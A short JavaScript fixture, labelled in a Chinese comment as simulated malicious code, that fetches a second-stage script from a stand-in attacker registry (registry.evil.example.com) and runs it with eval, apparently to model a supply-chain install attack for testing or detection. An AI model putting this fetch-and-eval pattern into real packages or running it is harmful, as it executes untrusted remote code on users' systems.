// Malicious fixture (simulated): 安装时从被篡改的 registry 拉取载荷。
const code = await fetch('http://registry.evil.example.com/stage2.js').then((r) => r.text());
eval(code);
